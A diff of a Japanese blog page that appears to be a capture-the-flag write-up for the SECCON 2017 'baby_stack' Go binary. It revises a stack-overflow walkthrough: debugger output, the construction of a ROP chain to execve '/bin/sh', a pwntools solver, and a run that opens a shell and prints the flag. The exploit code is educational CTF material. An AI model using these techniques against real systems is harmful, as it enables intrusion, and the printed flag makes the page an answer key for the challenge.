@@ -319,10 +319,6 @@ gef➤  dereference
 <pre class="example">
 gef➤  b *0x4012a4
 gef➤  g
-[New LWP 53720]
-[New LWP 53721]
-[New LWP 53722]
-[New LWP 53723]
 Please tell me your name &gt;&gt; hoge
 Give me your message &gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
 gef➤  dereference
@@ -340,17 +336,7 @@ gef➤  dereference
 runtime: out of memory: cannot allocate 7016996765293477888-byte block (1048576 in use)
 fatal error: out of memory
 
-runtime stack:
-runtime.throw(0x50c400, 0xd)
-        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
-runtime.largeAlloc(0x6161616161616161, 0x3, 0x0)
-        /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
-runtime.mallocgc.func3()
-        /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
-runtime.systemstack(0x5a0300)
-        /usr/lib/go-1.6/src/runtime/asm_amd64.s:291 +0x79
-runtime.mstart()
-        /usr/lib/go-1.6/src/runtime/proc.go:1051
+...
 
 goroutine 1 [running]:
 runtime.systemstack_switch()
@@ -365,10 +351,7 @@ runtime.slicebytetostring(0x0, 0x6161616161616161, 0x6161616161616161, 0x6161616
         /usr/lib/go-1.6/src/runtime/string.go:93 +0x6f fp=0xc820051d50 sp=0xc820051cb8
 main.main()
         /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x2f8 fp=0xc820051f50 sp=0xc820051d50
-[LWP 53723 exited]
-[LWP 53722 exited]
-[LWP 53721 exited]
-[LWP 53720 exited]
+...
 [Inferior 1 (process 53719) exited with code 02]
 </pre>
 <p>
@@ -397,17 +380,7 @@ gef➤
 runtime: out of memory: cannot allocate 7089054359331405824-byte block (1048576 in use)
 fatal error: out of memory
 
-runtime stack:
-runtime.throw(0x50c400, 0xd)
-   /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90
-runtime.largeAlloc(0x6261616161616162, 0x3, 0x0)
-   /usr/lib/go-1.6/src/runtime/malloc.go:768 +0xdd
-runtime.mallocgc.func3()
-   /usr/lib/go-1.6/src/runtime/malloc.go:664 +0x33
-runtime.systemstack(0x5a0300)
-   /usr/lib/go-1.6/src/runtime/asm_amd64.s:291 +0x79
-runtime.mstart()
-   /usr/lib/go-1.6/src/runtime/proc.go:1051
+...
 
 goroutine 1 [running]:
 runtime.systemstack_switch()
@@ -464,10 +437,6 @@ gef➤ dereference
 <div class="src src-python">
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac&#39;</span>
 </span></span><span style="display:flex;"><span>  buf2 <span style="color:#f92672">=</span> list(pattern)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># name</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0x68</span>:<span style="color:#ae81ff">0x70</span>] <span style="color:#f92672">=</span> p64(please_ptr) <span style="color:#75715e"># string ptr</span>
-</span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0x70</span>:<span style="color:#ae81ff">0x78</span>] <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6</span>)        <span style="color:#75715e"># string size</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e"># msg</span>
 </span></span><span style="display:flex;"><span>  buf2[<span style="color:#ae81ff">0xc8</span>:<span style="color:#ae81ff">0xd0</span>] <span style="color:#f92672">=</span> p64(please_ptr) <span style="color:#75715e"># string ptr</span>
@@ -560,27 +529,89 @@ gef➤ dereference
 <h4 id="headline-11">
 シェルの起動
 </h4>
+<div id="outline-text-headline-11" class="outline-text-4">
+<p>RIPを奪うことに成功したため、後はROPを組んでシェルを起動できればフラグを取れそうである。
+    そこで、まずシェルの起動に必要なROPガジェットを考える。</p>
+<p>
+    一般的はシェルの起動方法として、 <code>execve(&#34;/bin/sh&#34;, 0, 0)</code> を実行する方法がある。
+    これを実行するためには、 <code>rax=59</code> 、 <code>rdi=&#34;/bin/sh&#34;</code> 、 <code>rsi=0</code> および <code>rdx=0</code> を設定し、最後に <code>syscall</code> を呼び出す必要がある。</p>
+<p>
+    そこで、 <code>pop レジスタ; ret;</code> となるガジェットを探し、それぞれのレジスタを設定する。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e">## 0x00000000004026da: syscall;</span>
+</span></span><span style="display:flex;"><span>  syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004026da</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
+</span></span><span style="display:flex;"><span>  pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
+</span></span><span style="display:flex;"><span>  pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
+</span></span><span style="display:flex;"><span>  pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
+</span></span><span style="display:flex;"><span>  pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span></span></span></code></pre></div>
+</div>
+<p>それぞれ、使えそうなガジェットをropper集める。ここで、今回使用するガジェットで、 <code>pop rdi</code> を行うガジェットと <code>pop rdx</code> を行うガジェットはそれぞれ扱いに注意が必要である。</p>
+<p>
+    まず、 <code>pop rdi</code> を行う <code>pop rdi; or byte ptr [rax + 0x39], cl; ret;</code> は、 <code>pop rdi</code> 以外に <code>rax+0x39</code> のアドレスと <code>cl</code> レジスタの内容を or 演算する。
+    このため、 <code>rax</code> が書き込み不可なアドレスを指していた場合、プログラムがエラーで落ちてしまう。そこで、このガジェットの呼び出し前には、 <code>rax</code> が bss領域を指すようにすることでこの問題に対処する。</p>
+<p>
+    次に、 <code>pop rdx</code> を行う <code>pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</code> は、 スタック領域のアドレスに対して <code>setbe</code> 命令を行い、最後に <code>rsp</code> を <code>0x38</code> バイトだけ増加させる。
+    ここで、 <code>rsp</code> がずれると、後ろに続くROPチェーンが機能しなくなる。
+    そこで、~rsp~ が次のガジェットを指すようにこのガジェットの後で <code>0x38</code> バイトだけパディングを行うことでこの問題に対処する。</p>
+<p>
+    それぞれのレジスタにスタックから値をpopするガジェットの用意ができたため、これらを用いてROPチェーンを組んでいく。</p>
+<p>
+    ここで、 <code>rdi</code> には、 <code>&#34;/bin/sh&#34;</code> の文字列のアドレスを格納する必要がある。
+    しかし、実行ファイル上には、 <code>&#34;/bin/sh&#34;</code> の文字列は存在しない。そこで、ROPを用いてこの文字列をメモリ上に作成する。
+    文字列を作成する領域としては、アドレスが変わらず、メモリへの読み書きどちらも可能となるbss領域が適しているため、bss領域に <code>&#34;/bin/sh&#34;</code> を書き込むことを考える。</p>
+<p>
+    文字列をメモリ上に作成する方法として、ROPガジェットを利用して作成する方法と、 <code>write</code> システムコールを利用して作成する方法の2通りが考えられるが、今回は前者のROPガジェットを用いた方法を利用する。</p>
+<p>
+    この方法は、以下の手順で実現できる。</p>
+<ol>
+<li>
+<p>レジスタ1 ( <code>rdi</code> )に文字列を書き込みたいアドレス( <code>bss_addr</code> )を格納</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(bss_addr)</span></span></code></pre></div>
+</div>
+</li>
+<li>
+<p>レジスタ2( <code>rax</code> )に書き込みたい文字列( <code>&#34;/bin/sh&#34;</code> )を格納</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(pop_rax)
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span></span></span></code></pre></div>
+</div>
+</li>
+<li>
+<p><code>mov [レジスタ1], レジスタ2</code> の形のガジェットを利用し、レジスタ1の指すアドレスにレジスタ2の内容を書き込み</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
+</span></span><span style="display:flex;"><span>mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(mov_rdi_rax)</span></span></code></pre></div>
+</div>
+</li>
+</ol>
+<p>以上のROPガジェットを組み合わせることで、リターンアドレスの書き換えからシェルを起動することができる。</p>
+<p>
+    最後に、上記の流れをSolverとして実装したため、Solverとその実行結果を示す。</p>
+</div>
 </div>
 </div>
 </div>
 <div id="outline-container-headline-12" class="outline-3">
 <h3 id="headline-12">
-solverの作成
+Solver    
 </h3>
 <div id="outline-text-headline-12" class="outline-text-3">
 <div id="outline-container-headline-13" class="outline-4">
 <h4 id="headline-13">
-ROP
-</h4>
-<div id="outline-text-headline-13" class="outline-text-4">
-<p>rop gadgetについて</p>
-</div>
-</div>
-<div id="outline-container-headline-14" class="outline-4">
-<h4 id="headline-14">
 solver   
 </h4>
-<div id="outline-text-headline-14" class="outline-text-4">
+<div id="outline-text-headline-13" class="outline-text-4">
 <div class="src src-python">
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -639,7 +670,7 @@ solver
 </span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rdx = 0</span>
 </span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rdx)
 </span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
-</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span>
+</span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span>    <span style="color:#75715e"># add rsp, 0x38</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>   <span style="color:#75715e">## rsi = 0</span>
 </span></span><span style="display:flex;"><span>   buf2 <span style="color:#f92672">+=</span> p64(pop_rsi)
@@ -665,11 +696,11 @@ solver
 </div>
 </div>
 </div>
-<div id="outline-container-headline-15" class="outline-4">
-<h4 id="headline-15">
+<div id="outline-container-headline-14" class="outline-4">
+<h4 id="headline-14">
 実行結果
 </h4>
-<div id="outline-text-headline-15" class="outline-text-4">
+<div id="outline-text-headline-14" class="outline-text-4">
 <pre class="example">
 mc4nf@mc4nf:~/ctf/secconctf_2017/pwn/baby_stack$ python solve.py
 [*] &#39;/home/mc4nf/ctf/secconctf_2017/pwn/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;
@@ -688,8 +719,8 @@ flag.txt
 $ cat flag.txt
 SECCON{&#39;un54f3&#39;m0dul3_15_fr13ndly_70_4774ck3r5}
 </pre>
-<div id="outline-container-headline-16" class="outline-5">
-<h5 id="headline-16">
+<div id="outline-container-headline-15" class="outline-5">
+<h5 id="headline-15">
 <code>SECCON{&#39;un54f3&#39;m0dul3_15_fr13ndly_70_4774ck3r5}</code>
 </h5>
 </div>
